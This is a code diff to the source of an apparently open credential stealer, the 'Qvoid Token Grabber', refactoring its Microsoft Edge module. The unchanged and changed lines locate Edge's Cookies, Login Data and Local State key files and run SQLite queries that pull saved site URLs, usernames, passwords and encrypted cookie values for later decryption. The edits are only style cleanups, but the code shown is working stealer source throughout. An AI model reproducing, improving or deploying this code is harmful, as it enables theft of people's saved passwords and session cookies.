@@ -16,30 +16,18 @@ namespace Qvoid_Token_Grabber.PasswordGrabbers
 {
     class EdgeGrabber
     {
-        public string EdgeBrowserCookiePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Edge\User Data\Default\Cookies";
-        public string EdgeBrowserPasswordsPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Edge\User Data\Default\Login Data";
-        public string EdgeKeyPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Edge\User Data\Local State";
+        public string EdgeBrowserCookiePath = $@"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Microsoft\Edge\User Data\Default\Cookies", EdgeBrowserPasswordsPath = $@"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Microsoft\Edge\User Data\Default\Login Data", EdgeKeyPath = $@"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Microsoft\Edge\User Data\Local State";
 
         /// <summary>
         /// Returns a value depending on if the File "Cookies" was found
         /// </summary>
         /// <returns>true if Cookies was found and false if not</returns>
-        public bool CookiesExists()
-        {
-            if (File.Exists(EdgeBrowserCookiePath))
-                return true;
-            return false;
-        }
+        public bool CookiesExists() => File.Exists(EdgeBrowserCookiePath);
         /// <summary>
         /// Returns a value depending on if the File "Local State" was found
         /// </summary>
         /// <returns>true if File was found and false if not</returns>
-        public bool KeyExists()
-        {
-            if (File.Exists(EdgeKeyPath))
-                return true;
-            return false;
-        }
+        public bool KeyExists() => File.Exists(EdgeKeyPath);
 
 
         public List<Passwords> GetPasswordByHostname(string hostName, byte[] key)
@@ -80,7 +68,7 @@ namespace Qvoid_Token_Grabber.PasswordGrabbers
                 using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={EdgeBrowserPasswordsPath};pooling=false"))
                 using (var cmd = conn.CreateCommand())
                 {
-                    cmd.CommandText = $"SELECT origin_url,username_value,password_value FROM logins";
+                    cmd.CommandText = "SELECT origin_url,username_value,password_value FROM logins";
 
                     conn.Open();
                     using (var reader = cmd.ExecuteReader())
@@ -108,12 +96,7 @@ namespace Qvoid_Token_Grabber.PasswordGrabbers
         /// Returns a value depending on if the File "Login Data" was found
         /// </summary>
         /// <returns>true if Cookies was found and false if not</returns>
-        public bool PasswordsExists()
-        {
-            if (File.Exists(EdgeBrowserPasswordsPath))
-                return true;
-            return false;
-        }
+        public bool PasswordsExists() => File.Exists(EdgeBrowserPasswordsPath);
 
 
         public List<Cookie> GetCookiesByHostname(string hostName, byte[] key)
@@ -154,7 +137,7 @@ namespace Qvoid_Token_Grabber.PasswordGrabbers
                 using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={EdgeBrowserCookiePath};pooling=false"))
                 using (var cmd = conn.CreateCommand())
                 {
-                    cmd.CommandText = $"SELECT name,encrypted_value,host_key FROM cookies";
+                    cmd.CommandText = "SELECT name,encrypted_value,host_key FROM cookies";
 
                     conn.Open();
                     using (var reader = cmd.ExecuteReader())
